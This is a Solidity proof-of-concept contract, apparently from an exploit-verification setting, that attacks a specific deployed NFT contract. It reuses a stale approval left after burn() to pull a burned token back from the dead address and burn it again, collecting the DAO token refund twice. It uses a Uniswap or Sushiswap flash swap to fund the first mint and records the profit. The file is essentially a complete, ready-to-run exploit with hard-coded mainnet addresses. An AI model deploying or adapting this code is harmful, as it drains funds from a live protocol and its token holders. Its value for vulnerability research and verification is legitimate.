// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITheNFTV2 {
    function mint(uint256 amount) external;
    function burn(uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address private constant TARGET = 0x79a7D3559D73EA032120A69E59223d4375DEb595;
    address private constant DAO = 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413;
    address private constant DEAD_ADDRESS = 0x000000000000000000000000000000000074eda0;

    uint256 private constant ONE_DAO = 1e16;
    uint256 private constant TWO_DAO = 2e16;
    uint256 private constant MAX_SUPPLY = 1800;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    IERC20 private constant DAO_TOKEN = IERC20(DAO);
    ITheNFTV2 private constant NFT = ITheNFTV2(TARGET);

    address private activePair;
    uint256 private realizedProfit;

    constructor() {}

    function executeOnOpportunity() external {
        uint256 daoBefore = DAO_TOKEN.balanceOf(address(this));
        bool success;

        (bool hasToken, uint256 tokenId) = _findOwnedToken();
        if (hasToken) {
            success = _exerciseBurnPath(tokenId);
        } else if (daoBefore >= ONE_DAO && DAO_TOKEN.balanceOf(TARGET) >= ONE_DAO) {
            if (_mintOne()) {
                (hasToken, tokenId) = _findOwnedToken();
                success = hasToken && _exerciseBurnPath(tokenId);
            }
        } else {
            (address pair, uint256 amount0Out, uint256 amount1Out) = _findFlashPair();
            if (pair != address(0)) {
                activePair = pair;
                try this.startFlash(pair, amount0Out, amount1Out) {
                    success = true;
                } catch {}
                activePair = address(0);
            }
        }

        if (success) {
            uint256 daoAfter = DAO_TOKEN.balanceOf(address(this));
            if (daoAfter > daoBefore) {
                realizedProfit += daoAfter - daoBefore;
            }
        }
    }

    function startFlash(address pair, uint256 amount0Out, uint256 amount1Out) external {
        require(msg.sender == address(this), "self only");
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(ONE_DAO));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activePair, "invalid pair");
        require(sender == address(this), "invalid sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;

        require(_mintOne(), "mint failed");

        (bool hasToken, uint256 tokenId) = _findOwnedToken();
        require(hasToken, "no token");
        require(_exerciseBurnPath(tokenId), "exploit failed");

        require(DAO_TOKEN.transfer(msg.sender, repayAmount), "repay failed");
    }

    function profitToken() external pure returns (address) {
        return DAO;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _mintOne() internal returns (bool) {
        if (!DAO_TOKEN.approve(TARGET, ONE_DAO)) {
            return false;
        }

        try NFT.mint(1) {
            return true;
        } catch {
            return false;
        }
    }

    function _exerciseBurnPath(uint256 tokenId) internal returns (bool) {
        /*
            The verified deployment clears single-token approvals on regular owner/operator
            transfers, which is exactly what the failing trace shows for the current PoC's
            buyer leg. The burn path remains feasible because burn() transfers to DEAD_ADDRESS
            through _transfer() and never clears approval[tokenId].

            Preserved exploit causality from the finding's second path:
            approve(attacker, id) -> burn(id) -> stale approval survives on DEAD_ADDRESS
            -> transferFrom(DEAD_ADDRESS, attacker, id) -> burn(id) again for extra DAO.

            The flashswap is only funding for the initial 1 DAO mint cost. It does not change
            the vulnerability or the order of the exploit path.
        */

        if (DAO_TOKEN.balanceOf(TARGET) < TWO_DAO) {
            return false;
        }

        NFT.approve(address(this), tokenId);

        uint256 beforeFirstBurn = DAO_TOKEN.balanceOf(address(this));
        NFT.burn(tokenId);
        uint256 afterFirstBurn = DAO_TOKEN.balanceOf(address(this));
        if (afterFirstBurn < beforeFirstBurn + ONE_DAO) {
            return false;
        }

        try NFT.transferFrom(DEAD_ADDRESS, address(this), tokenId) {} catch {
            return false;
        }

        uint256 beforeSecondBurn = DAO_TOKEN.balanceOf(address(this));
        NFT.burn(tokenId);
        uint256 afterSecondBurn = DAO_TOKEN.balanceOf(address(this));
        return afterSecondBurn >= beforeSecondBurn + ONE_DAO;
    }

    function _findOwnedToken() internal view returns (bool, uint256) {
        if (NFT.balanceOf(address(this)) == 0) {
            return (false, 0);
        }

        for (uint256 i; i < MAX_SUPPLY; ++i) {
            try NFT.ownerOf(i) returns (address owner) {
                if (owner == address(this)) {
                    return (true, i);
                }
            } catch {}
        }

        return (false, 0);
    }

    function _findFlashPair() internal view returns (address pair, uint256 amount0Out, uint256 amount1Out) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];

        for (uint256 i; i < factories.length; ++i) {
            for (uint256 j; j < bases.length; ++j) {
                address candidate = IUniswapV2Factory(factories[i]).getPair(DAO, bases[j]);
                if (candidate == address(0)) {
                    continue;
                }
                if (DAO_TOKEN.balanceOf(candidate) < ONE_DAO) {
                    continue;
                }

                address token0 = IUniswapV2Pair(candidate).token0();
                if (token0 == DAO) {
                    return (candidate, ONE_DAO, 0);
                }
                if (IUniswapV2Pair(candidate).token1() == DAO) {
                    return (candidate, 0, ONE_DAO);
                }
            }
        }
    }
}
